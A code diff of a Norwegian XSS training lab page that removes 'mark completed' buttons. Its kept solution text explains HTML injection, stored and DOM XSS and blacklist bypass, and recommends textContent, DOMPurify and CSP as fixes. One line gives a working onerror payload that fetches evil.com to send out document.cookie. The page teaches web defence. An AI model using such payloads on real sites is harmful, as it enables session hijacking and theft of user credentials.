@@ -210,7 +210,6 @@ strong{font-weight:600;color:var(--text)}
           <div class="sol-box"><strong>HTML-injeksjon</strong> viser at nettleseren aksepterer tagger. Ikke direkte farlig alene, men bevis på at <code>innerHTML</code> brukes — neste steg er å legge til JavaScript via event handlers.<br><br>Neste lab: <code>onerror</code>-attributtet kjører JS når et bilde feiler å laste.</div>
         </div>
         <div id="done-xss-1" class="complete-banner"><span>✓</span> Lab 1 fullført!</div>
-        <button class="btn btn-success" style="margin-top:8px" onclick="markTaskDone('xss-1')">✓ Marker fullført</button>
       </div>
       <div class="lab-right">
         <div class="fake-browser">
@@ -290,7 +289,6 @@ strong{font-weight:600;color:var(--text)}
           <div class="sol-box"><strong>Payload:</strong> <code>&lt;img src=x onerror="document.getElementById('l2-cookie').style.display='block'"&gt;</code><br><br>En ekte angriper ville brukt: <code>onerror="fetch('https://evil.com/?c='+document.cookie)"</code> — sender session-cookien til angripers server i bakgrunnen, usynlig for brukeren.</div>
         </div>
         <div id="done-xss-2" class="complete-banner"><span>✓</span> Lab 2 fullført!</div>
-        <button class="btn btn-success" style="margin-top:8px" onclick="markTaskDone('xss-2')">✓ Marker fullført</button>
       </div>
       <div class="lab-right">
         <div class="fake-browser">
@@ -374,7 +372,6 @@ strong{font-weight:600;color:var(--text)}
           <div class="sol-box"><strong>Stored XSS er verre</strong> fordi payloaden kjøres for <em>alle</em> som besøker siden — inkludert admins. En admin som besøker siden med payloaden kan miste sin session.<br><br>Fix: sanitér innput <em>server-side</em> før lagring i database, og bruk <code>textContent</code> ved visning.</div>
         </div>
         <div id="done-xss-3" class="complete-banner"><span>✓</span> Lab 3 fullført!</div>
-        <button class="btn btn-success" style="margin-top:8px" onclick="markTaskDone('xss-3')">✓ Marker fullført</button>
       </div>
       <div class="lab-right">
         <div class="fake-browser">
@@ -458,7 +455,6 @@ strong{font-weight:600;color:var(--text)}
           <div class="sol-box"><strong>DOM XSS-fix:</strong> Bruk <code>textContent</code> i stedet for <code>innerHTML</code> når brukerinput fra URL vises.<br><br>Alternativt: encode URL-parametre med <code>encodeURIComponent()</code> og decode med <code>decodeURIComponent()</code> — taggetegn blir da <code>%3C</code> og <code>%3E</code>, som <code>innerHTML</code> ikke tolker som HTML.</div>
         </div>
         <div id="done-xss-4" class="complete-banner"><span>✓</span> Lab 4 fullført!</div>
-        <button class="btn btn-success" style="margin-top:8px" onclick="markTaskDone('xss-4')">✓ Marker fullført</button>
       </div>
       <div class="lab-right">
         <div class="fake-browser">
@@ -541,7 +537,6 @@ strong{font-weight:600;color:var(--text)}
           <div class="sol-box"><strong>Løsning:</strong> Blacklists er alltid ufullstendige. HTML har over 100 elementer og hundrevis av event handlers som kan kjøre JS.<br><br><strong>Riktig tilnærming:</strong> Whitelist — tillat kun kjente trygge tagger (f.eks. <code>&lt;b&gt;</code>, <code>&lt;i&gt;</code>) med et bibliotek som DOMPurify. Alt annet strippes.</div>
         </div>
         <div id="done-xss-5" class="complete-banner"><span>✓</span> Lab 5 fullført!</div>
-        <button class="btn btn-success" style="margin-top:8px" onclick="markTaskDone('xss-5')">✓ Marker fullført</button>
       </div>
       <div class="lab-right">
         <div class="fake-browser">
@@ -625,7 +620,6 @@ strong{font-weight:600;color:var(--text)}
           <div class="sol-box"><strong>Farligere enn vanlig phishing</strong> fordi URL-en er ekte (<code>bankapp.no</code>). Hengelåsen viser HTTPS. Brukeren ser ingenting mistenkelig.<br><br><strong>HttpOnly hjelper ikke</strong> — angriperen trenger ikke cookies. Han fanger passordet direkte via DOM-manipulasjon.<br><br><strong>Forsvar:</strong> Fix XSS-kilden + CSP som blokkerer inline scripts.</div>
         </div>
         <div id="done-xss-6" class="complete-banner"><span>✓</span> Lab 6 fullført!</div>
-        <button class="btn btn-success" style="margin-top:8px" onclick="markTaskDone('xss-6')">✓ Marker fullført</button>
       </div>
       <div class="lab-right">
         <div class="fake-browser">
@@ -722,7 +716,6 @@ strong{font-weight:600;color:var(--text)}
           6. Regelmessige pentester og SAST i CI/CD-pipeline</div>
         </div>
         <div id="done-xss-7" class="complete-banner"><span>✓</span> Lab 7 fullført!</div>
-        <button class="btn btn-success" style="margin-top:8px" onclick="markTaskDone('xss-7')">✓ Marker fullført</button>
       </div>
       <div class="lab-right">
         <div class="fake-browser">
